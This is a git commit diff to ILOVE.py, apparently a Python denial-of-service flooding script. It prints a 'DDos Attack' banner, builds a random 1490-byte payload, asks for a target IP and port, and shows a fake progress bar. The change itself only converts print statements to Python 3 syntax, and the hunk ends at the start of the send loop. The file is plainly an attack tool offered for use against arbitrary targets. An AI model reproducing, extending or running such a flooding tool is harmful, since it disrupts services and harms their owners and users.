3caaef91ea6dfaffc539b63b0f2bdb463259da01
Aryan <83180468+Aruack@users.noreply.github.com>
2022-11-12 16:00:53 +0530

    Update ILOVE.py

--- ILOVE.py
+++ ILOVE.py
@@ -28,24 +28,24 @@ bytes = random._urandom(1490)
 os.system("clear")
 os.system("figlet DDos Attack")
 print
-print "Author   : Aruack"
-print "github   : https://github.com/Aruack"
-print "insta    : https://www.instagram.com/aruack_official"
+print ("Author   : Aruack")
+print ("github   : https://github.com/Aruack")
+print ("insta    : https://www.instagram.com/aruack_official")
 print
 ip = raw_input("IP Target : ")
 port = input("Port       : ")
 
 os.system("clear")
 os.system("figlet Attack Starting")
-print "[                    ] 0% "
+print ("[                    ] 0% ")
 time.sleep(5)
-print "[=====               ] 25%"
+print ("[=====               ] 25%")
 time.sleep(5)
-print "[==========          ] 50%"
+print ("[==========          ] 50%")
 time.sleep(5)
-print "[===============     ] 75%"
+print ("[===============     ] 75%")
 time.sleep(5)
-print "[====================] 100%"
+print ("[====================] 100%")
 time.sleep(3)
 sent = 0
 while True:
